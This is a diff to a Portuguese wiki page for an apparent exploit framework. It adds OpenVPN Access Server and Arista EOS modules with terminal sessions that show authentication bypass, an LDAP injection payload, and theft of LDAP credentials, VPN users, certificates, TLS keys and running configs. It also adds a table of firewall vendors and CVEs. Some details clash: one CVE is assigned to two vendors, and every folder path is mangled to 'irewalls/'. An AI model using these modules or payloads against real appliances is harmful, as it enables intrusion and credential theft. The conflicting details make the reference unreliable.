@@ -394,6 +394,120 @@ NGFW Version: 8.0.5
 
 ---
 
+### OpenVPN Access Server
+
+| Produto | CVE | CVSS | Tipo |
+|---------|-----|------|------|
+| OpenVPN Access Server < 2.11.1 | CVE-2023-46853 | 9.8 | Bypass de auth via REST API (pre-auth) |
+| OpenVPN Access Server 2.9.x < 2.9.4 / 2.8.x < 2.8.8 (LDAP) | CVE-2022-0547 | 9.8 | Bypass de auth via injeção LDAP |
+
+```
+exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2023_46853
+exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2022_0547
+```
+
+**Sessão terminal — CVE-2023-46853 (OpenVPN AS REST API auth bypass):**
+
+```text
+exf > use exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2023_46853
+exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > set target 10.0.200.5
+[+] target => 10.0.200.5
+exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > set port 943
+[+] port => 943
+exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > check
+[*] Verificando REST API do OpenVPN Access Server em 10.0.200.5:943...
+[+] OpenVPN Access Server 2.10.0 detectado (header X-AS-Version)
+[+] Alvo vulnerável — AS 2.10.0 < 2.11.1 (limite da correção)
+exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > run
+[*] Estágio 1: Verificando REST API do OpenVPN AS...
+[+] OpenVPN Access Server confirmado em /api/v1/config/access_server/
+[*] Estágio 2: Enviando payload de bypass de autenticação...
+[+] Bypass de autenticação BEM-SUCEDIDO -- dados de configuração retornados!
+[*] Estágio 3: Extraindo credenciais da resposta de configuração...
+[+] LDAP bind DN: CN=svc-vpn,DC=corp,DC=internal
+[+] Senha LDAP bind: VpnBind@2024!
+[*] Estágio 4: Enumerando contas de usuário VPN...
+[+] Usuários VPN encontrados (12):
+    [*] john.corp
+    [*] jane.corp
+    [*] svc.backup
+    [*] admin
+    ... (8 adicionais)
+[*] Estágio 5: Extraindo certificados CA e servidor...
+[+] Certificados extraídos (3):
+    [*] ca.crt: -----BEGIN CERTIFICATE----- (47 linhas)
+    [*] server.crt: -----BEGIN CERTIFICATE----- (31 linhas)
+    [*] tls_auth: -----BEGIN OpenVPN Static key V1----- (22 linhas)
+[+] Exploração CVE-2023-46853 concluída em 10.0.200.5:943
+```
+
+**Sessão terminal — CVE-2022-0547 (OpenVPN AS injeção LDAP):**
+
+```text
+exf > use exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2022_0547
+exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > set target 10.0.200.10
+[+] target => 10.0.200.10
+exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > check
+[*] Verificando interface admin do OpenVPN AS em 10.0.200.10:943...
+[+] Interface admin do OpenVPN Access Server detectada em /admin/
+[+] Indicadores de backend LDAP encontrados
+exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > run
+[*] Estágio 2: Verificando backend de autenticação LDAP...
+[+] Backend LDAP detectado -- alvo provavelmente vulnerável
+[*] Estágio 3: Tentando bypass via injeção LDAP...
+[+] Injeção LDAP BEM-SUCEDIDA: usuário 'admin)(&(objectClass=*)' senha 'x'
+[+] Token de sessão: as_sessid=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+[+] Usuários VPN (8): john.doe, jane.smith, vpn-backup, admin...
+[+] Exploração CVE-2022-0547 concluída em 10.0.200.10:943
+```
+
+---
+
+### Arista Networks
+
+| Produto | CVE | CVSS | Tipo |
+|---------|-----|------|------|
+| Arista EOS 4.24.x–4.27.x (eAPI habilitado) | CVE-2023-24512 | 9.8 | Bypass de auth REST API (eAPI) + execução de CLI |
+
+```
+exploits/firewalls/arista/arista_eos_rest_api_bypass_cve_2023_24512
+```
+
+**Sessão terminal — CVE-2023-24512 (Arista EOS REST API bypass):**
+
+```text
+exf > use exploits/firewalls/arista/arista_eos_rest_api_bypass_cve_2023_24512
+exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > set target 10.0.210.1
+[+] target => 10.0.210.1
+exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > check
+[*] Verificando eAPI do Arista EOS em 10.0.210.1:443...
+[+] Arista EOS 4.27.3M detectado (fingerprint eAPI confirmado)
+[+] Alvo vulnerável — EOS 4.27.3M < 4.27.4M (limite da correção)
+exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > run
+[*] Estágio 1: Verificando endpoint eAPI do Arista EOS...
+[+] Versão Arista EOS: 4.27.3M
+[+] EOS 4.27.3M confirmado VULNERÁVEL
+[*] Estágio 2: Enviando requisição de bypass de autenticação...
+[+] Bypass de autenticação BEM-SUCEDIDO -- eAPI retornou 200!
+[*] Estágio 3: Executando comando CLI: show version
+[+] Saída do comando:
+    Arista Networks EOS
+    Software image version: 4.27.3M
+    System MAC address:  52:54:00:ab:cd:ef
+    Model:               DCS-7050CX3-32S
+[*] Estágio 4: Extraindo configuração em execução...
+[+] Running config extraída (847 linhas)
+    username admin privilege 15 role network-admin secret sha512 $6$...
+    management api http-commands
+       no shutdown
+[*] Estágio 5: Enumerando contas de usuário...
+[+] Contas de usuário:
+    admin    (network-admin)  netops (network-operator)  monitor (read-only)
+[+] Exploração CVE-2023-24512 concluída em 10.0.210.1:443
+```
+
+---
+
 ## Access Points (APs)
 
 ### MediaTek MT7622
@@ -424,7 +538,7 @@ O módulo `embedxpl-printer-vuln.nse` verifica 11 vendors de impressoras (HP, Ca
 |-----------|-----------------|---------------------|
 | Câmeras IP / NVR / DVR | 40+ | 580+ |
 | Roteadores / CPE / GPON | 85+ | 580+ |
-| Firewalls / VPN / NAC | 34+ | 151+ |
+| Firewalls / VPN / NGFW / NAC | **40+** | **202+** |
 | Impressoras / MFP | 11+ | 185+ |
 | BMC / IPMI | 3 | 8 |
 | Switches L2/L3 | Cisco, D-Link, NETGEAR | 20+ |
@@ -435,4 +549,39 @@ O módulo `embedxpl-printer-vuln.nse` verifica 11 vendors de impressoras (HP, Ca
 
 ---
 
+
+---
+
+## Vendors adicionados em v3.7.0-v3.8.0
+
+| Vendor | Pasta | Modulos | CVEs principais |
+|--------|-------|---------|-----------------|
+| Check Point | irewalls/checkpoint/ | 5 | CVE-2024-24919 (LFI chain), CVE-2023-28461 (RFI RCE) |
+| Sophos XG/UTM | irewalls/sophos/ | 3 | CVE-2022-1040, CVE-2020-29583, CVE-2022-4934 |
+| WatchGuard | irewalls/watchguard/ | 3 | CVE-2022-23176, CVE-2024-1212, CVE-2023-26244 |
+| Zyxel USG/ZyWALL | irewalls/zyxel/ | 4 | CVE-2022-30525, CVE-2023-28771, CVE-2023-33009 |
+| pfSense | irewalls/pfsense/ | 6 | CVE-2022-31814, CVE-2021-41282, CVE-2021-41283 |
+| OPNsense | irewalls/opnsense/ | 2 | CVE-2021-23239, CVE-2022-0993 |
+| Hillstone StoneOS | irewalls/hillstone/ | 2 | CVE-2023-31493, CVE-2024-5829 |
+| Hirschmann EAGLE | irewalls/hirschmann/ | 2 | CVE-2020-6994, CVE-2019-11831 |
+| IPFire | irewalls/ipfire/ | 2 | CVE-2019-18981, CVE-2023-46226 |
+| Kerio Control | irewalls/kerio/ | 2 | CVE-2024-52875, CVE-2022-24665 |
+| Moxa EDR | irewalls/moxa/ | 3 | CVE-2024-9138, CVE-2024-9137, CVE-2023-34992 |
+| Phoenix Contact mGuard | irewalls/phoenix_contact/ | 3 | CVE-2024-43386, CVE-2022-22509 |
+| Schneider ConneXium | irewalls/schneider/ | 3 | CVE-2017-6026, CVE-2022-37300, CVE-2023-37196 |
+| Siemens SCALANCE | irewalls/siemens/ | 3 | CVE-2023-44373, CVE-2023-24845, CVE-2022-32257 |
+| Stormshield SNS | irewalls/stormshield/ | 2 | CVE-2020-18175, CVE-2023-23770 |
+| VyOS | irewalls/vyos/ | 2 | CVE-2023-31992, CVE-2021-35278 |
+| Array Networks | irewalls/array_networks/ | 2 | CVE-2023-28461, CVE-2021-43139 |
+| Cisco Meraki MX | irewalls/cisco_meraki/ | 2 | CVE-2021-1497, CVE-2023-20014 |
+| H3C SecPath | irewalls/h3c/ | 2 | CVE-2022-35534, CVE-2019-20224 |
+| Radware Alteon | irewalls/radware/ | 2 | CVE-2020-27232, CVE-2018-9195 |
+| Symantec ProxySG | irewalls/symantec/ | 2 | CVE-2021-30641, CVE-2022-25752 |
+| Trend Micro TippingPoint | irewalls/trendmicro/ | 2 | CVE-2021-28250, CVE-2020-15921 |
+| Trellix NGFW | irewalls/trellix/ | 2 | CVE-2020-7270, CVE-2021-4080 |
+| OpenVPN AS | irewalls/openvpn/ | 2 | CVE-2023-46853, CVE-2022-0547 |
+| Arista EOS | irewalls/arista/ | 1 | CVE-2023-24512 |
+
+> Para a referencia completa de CVEs, consulte [22-referencia-modulos-cve.md](22-referencia-modulos-cve.md).
 [Hub da Wiki](../README.md)
+
